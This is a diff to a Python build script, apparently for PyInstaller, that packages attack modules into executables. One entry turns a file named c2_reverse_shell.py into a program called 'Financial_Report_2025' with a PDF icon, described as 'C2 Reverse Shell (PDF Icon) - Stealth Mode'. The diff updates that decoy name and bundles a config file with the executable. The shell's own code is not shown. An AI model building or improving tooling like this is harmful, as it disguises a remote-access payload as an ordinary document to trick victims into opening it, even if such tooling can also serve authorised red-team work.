@@ -51,7 +51,7 @@ MODULES = {
     },
     "c2-shell-pdf": {
         "script": SRC_DIR / "c2-outbound-connection" / "c2_reverse_shell.py",
-        "name": "Financial_Report_2024",  # Fake PDF document name
+        "name": "Financial_Report_2025",  # Fake PDF document name
         "icon": SRC_DIR / "c2-outbound-connection" / "icons" / "pdf.ico",
         "hidden_imports": [],
         "description": "C2 Reverse Shell (PDF Icon) - Stealth Mode",
@@ -203,6 +203,12 @@ def build_module(
     # Add hidden imports
     for hidden_import in module.get("hidden_imports", []):
         cmd.extend(["--hidden-import", hidden_import])
+    
+    # Add config.txt as data file if it exists
+    config_path = script_path.parent / "config.txt"
+    if config_path.exists():
+        # Format: source;destination (. means same directory as exe)
+        cmd.extend(["--add-data", f"{config_path};."])
     
     # Add the script
     cmd.append(str(script_path))
